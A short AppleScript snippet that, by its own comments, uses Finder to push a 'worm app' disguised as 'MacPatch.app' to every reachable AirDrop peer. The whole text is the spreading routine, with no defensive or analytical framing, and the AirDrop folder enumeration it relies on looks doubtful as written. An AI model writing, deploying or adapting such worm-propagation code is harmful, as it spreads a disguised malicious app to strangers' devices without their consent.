-- Uses Finder to share a malicious file via AirDrop

tell application "Finder"
	-- Get all available AirDrop peers
	set targetDevices to every item of entire contents of folder "AirDrop"

	-- Loop through each peer and send the worm app
	repeat with d in targetDevices
		try
			set fileToSend to POSIX file "/Users/Shared/MacPatch.app"
			-- Attempt to copy to the AirDrop target
			duplicate fileToSend to d
		end try
	end repeat
end tell
